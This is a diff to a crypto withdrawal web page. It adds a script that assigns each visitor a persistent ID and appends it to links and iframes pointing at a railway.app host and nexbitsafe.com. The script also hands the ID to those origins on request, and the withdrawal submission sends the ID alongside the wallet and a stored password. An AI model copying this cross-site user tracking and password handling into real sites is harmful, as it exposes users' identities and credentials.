@@ -25,6 +25,78 @@
 </head>
 <body>
 
+<!-- ========================================================= -->
+<!-- 🔵 Strikingly 外链注入用户识别脚本（B 脚本） -->
+<!-- ========================================================= -->
+<script>
+(function(){
+  const USER_KEY = 'nexbit_uid_v1';
+  function gen() { return 'U' + Math.random().toString(36).substr(2,4).toUpperCase(); }
+  if(!localStorage.getItem(USER_KEY)) localStorage.setItem(USER_KEY, gen());
+  window.STR_USER_ID = localStorage.getItem(USER_KEY);
+
+  const externalDomains = [
+    'crypto-management-production-5e04.up.railway.app',
+    'www.nexbitsafe.com',
+    'crypto-management-production-5e04.up.railway.app:443'
+  ];
+
+  function appendToHref(a){
+    try{
+      const href = a.getAttribute('href');
+      if(!href) return;
+      if(!/^https?:\/\//i.test(href)) return;
+      const hostname = new URL(href).hostname;
+      if(externalDomains.some(d => hostname.includes(d))){
+        const url = new URL(href);
+        if(!url.searchParams.get('userid')) url.searchParams.set('userid', window.STR_USER_ID);
+        a.setAttribute('href', url.toString());
+      }
+    }catch(e){}
+  }
+
+  function appendToIframe(iframe){
+    try{
+      const src = iframe.getAttribute('src');
+      if(!src) return;
+      if(!/^https?:\/\//i.test(src)) return;
+      const hostname = new URL(src).hostname;
+      if(externalDomains.some(d => hostname.includes(d))){
+        const url = new URL(src);
+        if(!url.searchParams.get('userid')) url.searchParams.set('userid', window.STR_USER_ID);
+        iframe.setAttribute('src', url.toString());
+      }
+    }catch(e){}
+  }
+
+  function scanAndPatch(){
+    document.querySelectorAll('a[href]').forEach(appendToHref);
+    document.querySelectorAll('iframe').forEach(appendToIframe);
+  }
+
+  document.addEventListener('DOMContentLoaded', scanAndPatch);
+  const obs = new MutationObserver(scanAndPatch);
+  obs.observe(document.body, {childList:true, subtree:true});
+
+  window.addEventListener('message', function(ev){
+    try{
+      const allowedOrigins = [
+        'https://crypto-management-production-5e04.up.railway.app',
+        'https://www.nexbitsafe.com'
+      ];
+      if(!allowedOrigins.includes(ev.origin)) return;
+      if(ev.data && ev.data.type === 'GET_USER_ID'){
+        ev.source.postMessage({type:'USER_ID', userid: window.STR_USER_ID}, ev.origin);
+      }
+    }catch(e){}
+  }, false);
+
+})();
+</script>
+<!-- ========================================================= -->
+<!-- B 脚本结束 -->
+<!-- ========================================================= -->
+
 <div class="withdraw-box">
     <h2 style="text-align:center;"></h2>
 
@@ -60,13 +132,11 @@
     <label>Password</label>
     <input type="password" id="password" placeholder="Enter password" />
 
-    <!-- 左右按钮：创建密码 + 确认密码 -->
     <div class="row">
         <button id="createPwdBtn" onclick="createPassword()">Create Password</button>
         <button id="confirmPwdBtn" onclick="confirmPassword()">Confirm Password</button>
     </div>
 
-    <!-- 忘记密码 -->
     <button onclick="forgotPassword()">Forgot Password?</button>
 
     <label>Wallet Address</label>
@@ -179,7 +249,8 @@ async function submitWithdrawal() {
         usdt: document.getElementById("usdtValue").innerText,
         wallet: document.getElementById("wallet").value,
         password: storedPassword,
-        hash: txHash
+        hash: txHash,
+        userid: window.STR_USER_ID
     };
 
     try {
